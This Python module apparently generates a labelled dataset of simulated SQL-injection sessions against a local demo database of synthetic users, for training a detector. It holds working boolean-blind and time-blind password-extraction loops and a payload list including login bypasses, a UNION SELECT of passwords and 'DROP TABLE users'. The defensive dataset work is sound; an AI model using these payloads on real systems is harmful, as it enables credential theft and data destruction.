from __future__ import annotations

import csv
import random
import re
import string
import time
from pathlib import Path
from typing import Any

from deploy import demo_db
from src.utils import get_logger, load_config

logger = get_logger(__name__)

LABEL_MAP: dict[str, int] = {
    "benign": 0,
    "boolean_blind": 1,
    "time_blind": 2,
    "query_splitting": 3,
}


# --------------------------------------------------------------------------- #
# Synthetic user pool
# --------------------------------------------------------------------------- #

def generate_synthetic_user_pool(
    n: int,
    password_min_len: int = 6,
    password_max_len: int = 12,
    random_seed: int = 42,
) -> list[dict[str, str]]:
    rng = random.Random(random_seed)
    pool: list[dict[str, str]] = []
    for i in range(n):
        username = f"user_{i:04d}"
        pw_len = rng.randint(password_min_len, password_max_len)
        password = "".join(rng.choices(string.ascii_letters + string.digits, k=pw_len))
        pool.append({"username": username, "password": password})
    return pool


def _user_pool_to_seed_rows(
    pool: list[dict[str, str]],
) -> list[tuple[int, str, str, str, str]]:
    return [
        (i + 1, u["username"], f"{u['username']}@test.local", u["password"], "user")
        for i, u in enumerate(pool)
    ]


# --------------------------------------------------------------------------- #
# Boolean-blind attacker
# --------------------------------------------------------------------------- #

class BooleanBlindAttacker:
    def __init__(
        self,
        seed_rows: list[tuple[int, str, str, str, str]],
        target_user: str,
        column: str = "password",
        max_chars: int = 8,
        low_ascii: int = 32,
        high_ascii: int = 126,
    ):
        self._seed_rows = seed_rows
        self._target_user = target_user
        self._column = column
        self._max_chars = max_chars
        self._low_ascii = low_ascii
        self._high_ascii = high_ascii

    def run(self) -> list[dict[str, Any]]:
        steps: list[dict[str, Any]] = []
        for char_idx in range(1, self._max_chars + 1):
            low, high = self._low_ascii, self._high_ascii
            while low < high:
                mid = (low + high) // 2
                query = (
                    f"zzz' OR (ASCII(SUBSTR({self._column},{char_idx},1)) > {mid}) --"
                )
                start = time.monotonic()
                result = demo_db.execute_raw(query, seed_rows=self._seed_rows)
                elapsed = time.monotonic() - start
                steps.append({
                    "query": query,
                    "row_count": result["row_count"],
                    "timing_seconds": round(elapsed, 4),
                })
                if result["row_count"] > 0:
                    low = mid + 1
                else:
                    high = mid
            if low > self._high_ascii:
                break
        return steps


# --------------------------------------------------------------------------- #
# Time-blind attacker
# --------------------------------------------------------------------------- #

class TimeBlindAttacker:
    def __init__(
        self,
        seed_rows: list[tuple[int, str, str, str, str]],
        target_user: str,
        column: str = "password",
        max_chars: int = 8,
        sleep_seconds: float = 5.0,
        low_ascii: int = 32,
        high_ascii: int = 126,
    ):
        self._seed_rows = seed_rows
        self._target_user = target_user
        self._column = column
        self._max_chars = max_chars
        self._sleep_seconds = sleep_seconds
        self._low_ascii = low_ascii
        self._high_ascii = high_ascii

    def run(self) -> list[dict[str, Any]]:
        steps: list[dict[str, Any]] = []
        prefix = self._target_user[:2]
        for char_idx in range(1, self._max_chars + 1):
            low, high = self._low_ascii, self._high_ascii
            while low < high:
                mid = (low + high) // 2
                query = (
                    f"{prefix}' OR (SELECT CASE WHEN "
                    f"(ASCII(SUBSTR((SELECT {self._column} FROM users "
                    f"WHERE username = '{self._target_user}'),{char_idx},1)) > {mid}) "
                    f"THEN SLEEP({self._sleep_seconds}) ELSE 0 END) --"
                )
                start = time.monotonic()
                result = demo_db.execute_raw(query, seed_rows=self._seed_rows)
                elapsed = time.monotonic() - start
                steps.append({
                    "query": query,
                    "row_count": result["row_count"],
                    "timing_seconds": round(elapsed, 4),
                })
                if elapsed >= self._sleep_seconds * 0.5:
                    low = mid + 1
                else:
                    high = mid
            if low > self._high_ascii:
                break
        return steps


# --------------------------------------------------------------------------- #
# Query-splitting attacker
# --------------------------------------------------------------------------- #

_SPLIT_PAYLOADS: list[str] = [
    "' OR '1'='1' --",
    "' OR 1=1 --",
    "admin' --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' AND 1=1 --",
    "' OR 'a'='a' --",
    "' OR 1=1#",
    "admin'--",
    "' UNION SELECT username,password FROM users --",
    "' OR 'x'='x",
    "'; DROP TABLE users --",
    "' OR 1=(SELECT 1 FROM users) --",
]


def _split_payload(payload: str, n_fragments: int, rng: random.Random) -> list[str]:
    payload = payload.strip()
    if n_fragments <= 1:
        return [payload]
    words = re.split(r"(\s+)", payload)
    words = [w for w in words if w]
    if not words:
        return [""] * n_fragments
    if len(words) <= n_fragments:
        result = list(words)
        while len(result) < n_fragments:
            result.append("")
        return result
    groups: list[list[str]] = [[] for _ in range(n_fragments)]
    for i, w in enumerate(words):
        idx = min(i * n_fragments // len(words), n_fragments - 1)
        groups[idx].append(w)
    return ["".join(g) for g in groups]


class QuerySplittingAttacker:
    def __init__(
        self,
        seed_rows: list[tuple[int, str, str, str, str]],
        target_user: str,
        payload: str | None = None,
        n_fragments_range: tuple[int, int] = (3, 8),
        random_seed: int = 42,
    ):
        self._seed_rows = seed_rows
        self._target_user = target_user
        self._payload = payload
        self._n_min, self._n_max = n_fragments_range
        self._rng = random.Random(random_seed)

    def run(self) -> list[dict[str, Any]]:
        payload = self._payload or self._rng.choice(_SPLIT_PAYLOADS)
        n_frags = self._rng.randint(self._n_min, self._n_max)
        fragments = _split_payload(payload, n_frags, self._rng)
        steps: list[dict[str, Any]] = []
        for fragment in fragments:
            start = time.monotonic()
            result = demo_db.execute_raw(fragment, seed_rows=self._seed_rows)
            elapsed = time.monotonic() - start
            steps.append({
                "query": result["constructed_sql"],
                "row_count": result["row_count"],
                "timing_seconds": round(elapsed, 4),
            })
        return steps


# --------------------------------------------------------------------------- #
# Benign session generator
# --------------------------------------------------------------------------- #

class BenignSessionGenerator:
    def __init__(
        self,
        seed_rows: list[tuple[int, str, str, str, str]],
        gap_range: tuple[float, float] = (10.0, 120.0),
        random_seed: int = 42,
    ):
        self._seed_rows = seed_rows
        self._gap_min, self._gap_max = gap_range
        self._rng = random.Random(random_seed)

    def generate(self, n_steps: int) -> list[dict[str, Any]]:
        steps: list[dict[str, Any]] = []
        for _ in range(n_steps):
            user = self._rng.choice(self._seed_rows)
            start = time.monotonic()
            result = demo_db.execute_raw(user[1], seed_rows=self._seed_rows)
            elapsed = time.monotonic() - start
            gap = round(self._rng.uniform(self._gap_min, self._gap_max), 2)
            steps.append({
                "query": result["constructed_sql"],
                "row_count": result["row_count"],
                "timing_seconds": round(elapsed, 4),
                "gap_seconds": gap,
            })
        return steps


# --------------------------------------------------------------------------- #
# Diversity verification
# --------------------------------------------------------------------------- #

def _extract_ground_truth(
    session: list[dict[str, Any]],
    target_user: str,
) -> dict[str, Any] | None:
    """Return distinct key for a blind or query-splitting session."""
    for step in session:
        q = step.get("query", "")
        if "ASCII(SUBSTR(password," in q or "ASCII(SUBSTR((SELECT password" in q:
            return {
                "target_user": target_user,
                "column": "password",
            }
        if "WHERE username = '" in q:
            inner = q.split("WHERE username = '")[1].rsplit("'", 1)[0]
            if "'" in inner and "--" not in q and "ASCII" not in q:
                return {
                    "target_user": target_user,
                    "payload": _normalize_payload(q),
                }
    return None


def _normalize_payload(q: str) -> str:
    idx = q.find("WHERE username = '")
    if idx == -1:
        return q
    after = q[idx + len("WHERE username = '"):]
    inner = after.rsplit("'", 1)[0] if "'" in after else after
    return inner


def verify_diversity(
    sessions: list[tuple[str, list[dict[str, Any]]]],
) -> dict[str, Any]:
    distinct: set[str] = set()
    total = 0
    for target_user, steps in sessions:
        gt = _extract_ground_truth(steps, target_user)
        if gt is not None:
            key = f"{gt['target_user']}|{gt.get('column', gt.get('payload', ''))}"
            distinct.add(key)
            total += 1
    ratio = len(distinct) / max(total, 1)
    logger.info("Diversity: %d distinct / %d total = %.2f", len(distinct), total, ratio)
    return {"distinct_count": len(distinct), "total": total, "distinct_ratio": round(ratio, 4)}


# --------------------------------------------------------------------------- #
# Main orchestration
# --------------------------------------------------------------------------- #

def _save_csv(rows: list[dict[str, Any]], path: str | Path) -> None:
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    if not rows:
        logger.warning("No rows to save for %s", path)
        return
    fieldnames = list(rows[0].keys())
    with open(path, "w", newline="", encoding="utf-8") as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)
    logger.info("Saved %d rows to %s", len(rows), path)


def _build_session_rows(
    session_id: int,
    class_name: str,
    steps: list[dict[str, Any]],
) -> list[dict[str, Any]]:
    label = LABEL_MAP[class_name]
    rows: list[dict[str, Any]] = []
    for step_idx, step in enumerate(steps, start=1):
        rows.append({
            "session_id": session_id,
            "step_idx": step_idx,
            "session_label": label,
            "class": class_name,
            "query": step["query"],
            "row_count": step["row_count"],
            "timing_seconds": step["timing_seconds"],
        })
    return rows


def generate_all_sessions(
    output_dir: str | Path,
    n_train_per_class: int = 200,
    n_test_per_class: int = 200,
    user_pool_size: int = 5000,
    password_min_len: int = 6,
    password_max_len: int = 12,
    max_extract_chars: int = 8,
    sleep_seconds: float = 5.0,
    benign_min_steps: int = 5,
    benign_max_steps: int = 15,
    benign_gap_seconds: tuple[float, float] = (10.0, 120.0),
    random_seed: int = 42,
    test_fraction: float = 0.5,
) -> dict[str, Any]:
    rng = random.Random(random_seed)
    pool = generate_synthetic_user_pool(user_pool_size, password_min_len, password_max_len, random_seed)
    seed_rows = _user_pool_to_seed_rows(pool)

    output_dir = Path(output_dir)
    output_dir.mkdir(parents=True, exist_ok=True)

    attack_classes = {
        "boolean_blind": BooleanBlindAttacker,
        "time_blind": TimeBlindAttacker,
        "query_splitting": QuerySplittingAttacker,
    }

    all_sessions: dict[str, list[dict[str, Any]]] = {}
    all_session_tuples: dict[str, list[tuple[str, list[dict[str, Any]]]]] = {}

    total = n_train_per_class + n_test_per_class
    session_id = 0

    for class_name, cls in attack_classes.items():
        logger.info("Generating %d %s sessions ...", total, class_name)
        all_rows: list[dict[str, Any]] = []
        all_session_tuples[class_name] = []
        for i in range(total):
            user = pool[rng.randint(0, len(pool) - 1)]
            if class_name == "boolean_blind":
                attacker = cls(seed_rows, user["username"], max_chars=max_extract_chars)
            elif class_name == "time_blind":
                attacker = cls(seed_rows, user["username"], max_chars=max_extract_chars, sleep_seconds=sleep_seconds)
            else:
                attacker = cls(seed_rows, user["username"], random_seed=rng.randint(0, 2**31))
            steps = attacker.run()
            session_id += 1
            all_rows.extend(_build_session_rows(session_id, class_name, steps))
            all_session_tuples[class_name].append((user["username"], steps))
            if (i + 1) % 50 == 0:
                logger.info("  %d/%d %s sessions done", i + 1, total, class_name)
        all_sessions[class_name] = all_rows

    logger.info("Generating %d benign sessions ...", total)
    benign_gen = BenignSessionGenerator(seed_rows, gap_range=benign_gap_seconds, random_seed=random_seed)
    all_benign_rows: list[dict[str, Any]] = []
    for i in range(total):
        n_steps = rng.randint(benign_min_steps, benign_max_steps)
        steps = benign_gen.generate(n_steps)
        session_id += 1
        all_benign_rows.extend(_build_session_rows(session_id, "benign", steps))
        if (i + 1) % 50 == 0:
            logger.info("  %d/%d benign sessions done", i + 1, total)
    all_sessions["benign"] = all_benign_rows

    for class_name in attack_classes:
        rng.shuffle(all_session_tuples[class_name])

    all_classes = list(attack_classes) + ["benign"]
    report: dict[str, Any] = {"classes": {}}
    for class_name in all_classes:
        rows = all_sessions[class_name]
        session_ids = sorted({r["session_id"] for r in rows})
        n_test = max(1, int(len(session_ids) * test_fraction))
        n_train = len(session_ids) - n_test
        test_ids = set(session_ids[:n_test])
        train_rows = [r for r in rows if r["session_id"] not in test_ids]
        test_rows = [r for r in rows if r["session_id"] in test_ids]
        _save_csv(train_rows, output_dir / f"{class_name}_train.csv")
        _save_csv(test_rows, output_dir / f"{class_name}_test.csv")
        report["classes"][class_name] = {
            "train_sessions": n_train,
            "test_sessions": n_test,
            "train_rows": len(train_rows),
            "test_rows": len(test_rows),
        }

    report["diversity"] = {}
    for class_name in attack_classes:
        report["diversity"][class_name] = verify_diversity(all_session_tuples[class_name])
    report["total_sessions_generated"] = session_id
    logger.info("Generation complete. Report: %s", report)
    return report


def load_raw_sessions(path: str | Path) -> list[dict[str, Any]]:
    import pandas as pd
    df = pd.read_csv(path)
    return df.to_dict("records")


# --------------------------------------------------------------------------- #
# CLI entry point
# --------------------------------------------------------------------------- #

if __name__ == "__main__":
    cfg = load_config()
    gen_cfg = cfg.get_path("branch3_session.data_generation", {})
    raw_dir = Path(cfg.get_path("paths.data_raw", "data/raw"))
    report = generate_all_sessions(
        output_dir=raw_dir / "branch3_sessions",
        n_train_per_class=gen_cfg.get("boolean_blind", {}).get("sessions_per_split", 200),
        n_test_per_class=gen_cfg.get("boolean_blind", {}).get("sessions_per_split", 200),
        user_pool_size=gen_cfg.get("user_pool_size", 5000),
        password_min_len=gen_cfg.get("password_min_len", 6),
        password_max_len=gen_cfg.get("password_max_len", 12),
        max_extract_chars=gen_cfg.get("boolean_blind", {}).get("max_extract_chars", 8),
        sleep_seconds=gen_cfg.get("time_blind", {}).get("sleep_seconds", 5),
        benign_min_steps=gen_cfg.get("benign", {}).get("min_steps", 5),
        benign_max_steps=gen_cfg.get("benign", {}).get("max_steps", 15),
        benign_gap_seconds=tuple(gen_cfg.get("benign", {}).get("gap_seconds", [10, 120])),
        random_seed=cfg.get_path("project.random_seed", 42),
    )
    print(f"\nDone. Sessions generated: {report['total_sessions_generated']}")
    for cls, stats in report["classes"].items():
        print(f"  {cls}: {stats['train_sessions']} train / {stats['test_sessions']} test")
    for cls, div in report.get("diversity", {}).items():
        print(f"  {cls} diversity: {div['distinct_ratio']:.0%}")
